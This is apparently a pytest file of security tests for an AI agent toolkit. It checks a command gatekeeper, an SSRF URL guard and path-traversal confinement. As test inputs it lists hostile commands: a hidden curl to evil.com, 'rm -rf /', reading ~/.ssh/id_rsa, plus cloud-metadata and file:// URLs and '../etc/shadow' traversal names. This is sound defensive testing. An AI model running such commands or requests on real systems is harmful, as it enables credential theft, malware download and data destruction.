import pytest
import tempfile
from pathlib import Path
from src.tools.gatekeeper import ASTGatekeeper
from src.tools.models import CommandRiskLevel
from src.research.extractor import SSRFGuard, SSRFSecurityError, ContentExtractor
from src.vault.vault_sync import ObsidianVaultSync
from src.runtime.session import ConversationSession
from src.memory_client.client import MemoryServiceClient


def test_gatekeeper_blocks_newline_command_injection():
    """Verify multi-line command chaining cannot bypass gatekeeper risk checks."""
    # Attempt: Hide a state-modifying curl command behind a safe echo
    evasion_cmd = "echo hello\ncurl http://evil.com/malware"
    eval_res = ASTGatekeeper.evaluate(evasion_cmd)
    # Must NOT be classified as SAFE
    assert eval_res.risk_level == CommandRiskLevel.CAUTION
    assert eval_res.requires_approval is True

    # Attempt: Hide a prohibited drive-wipe behind ls
    forbidden_cmd = "ls -la\nrm -rf /"
    forbid_res = ASTGatekeeper.evaluate(forbidden_cmd)
    assert forbid_res.risk_level == CommandRiskLevel.FORBIDDEN
    assert forbid_res.is_allowed is False

    # Attempt: Carriage return with credential read
    cr_cmd = "pwd\r\ncat ~/.ssh/id_rsa"
    cr_res = ASTGatekeeper.evaluate(cr_cmd)
    assert cr_res.risk_level == CommandRiskLevel.CAUTION
    assert cr_res.requires_approval is True


def test_ssrf_guard_blocks_private_and_cloud_metadata():
    """Verify SSRFGuard strictly rejects internal, loopback, private, and metadata targets."""
    prohibited_urls = [
        "http://localhost:8000",
        "http://127.0.0.1:5432",
        "http://[::1]:8080",
        "http://0.0.0.0:80",
        "http://169.254.169.254/latest/meta-data",
        "http://100.100.100.200/latest/meta-data",
        "http://10.1.2.3/secret",
        "http://192.168.1.1/router",
        "http://172.16.0.5/docker",
        "file:///etc/passwd",
        "ftp://mirror.org/test",
        "gopher://evil.com/1",
    ]

    for url in prohibited_urls:
        with pytest.raises(SSRFSecurityError):
            SSRFGuard.validate_url(url)


def test_vault_sync_path_traversal_confinement():
    """Verify that ObsidianVaultSync cannot write or escape outside its designated root."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        vault_root = Path(tmp_dir) / "vault"
        vault = ObsidianVaultSync(vault_path=vault_root)

        # 1. Attempt traversal in entity name
        traversal_entity = {
            "canonical_name": "../../escape_entity",
            "category": "exploit",
        }
        res_path = vault.export_entity(traversal_entity)
        assert res_path.exists()
        # Must be strictly confined inside vault_root / "entities"
        assert res_path.resolve().is_relative_to(vault.entities_dir.resolve())
        assert res_path.name == "escape_entity.md"

        # 2. Attempt traversal in research dossier
        traversal_dossier = {
            "topic": "../../../etc/shadow",
            "summary": "Exploit attempt",
            "key_findings": [],
            "claims": [],
            "sources": [],
        }
        res_dossier = vault.export_research_dossier(traversal_dossier)
        assert res_dossier.exists()
        assert res_dossier.resolve().is_relative_to(vault.research_dir.resolve())
        assert "etc_shadow.md" in res_dossier.name


@pytest.mark.asyncio
async def test_session_dossier_reader_path_traversal_blocked():
    """Verify that /dossier command strictly rejects path traversal input."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        vault = ObsidianVaultSync(vault_path=Path(tmp_dir))
        memory = MemoryServiceClient(base_url="http://localhost:8000")
        session = ConversationSession(vault_sync=vault, memory_client=memory)

        # Attempt to read parent files via /dossier
        tokens = []
        async for token in session.process_turn("/dossier ../../LUMEN_ENGINEERING_LOG"):
            tokens.append(token)
        reply = "".join(tokens)

        # Must not disclose files outside research_dir
        assert "Security violation" in reply or "Could not find a research dossier" in reply
        assert "ADR-001" not in reply  # Content of engineering log must not be exposed

        await memory.close()
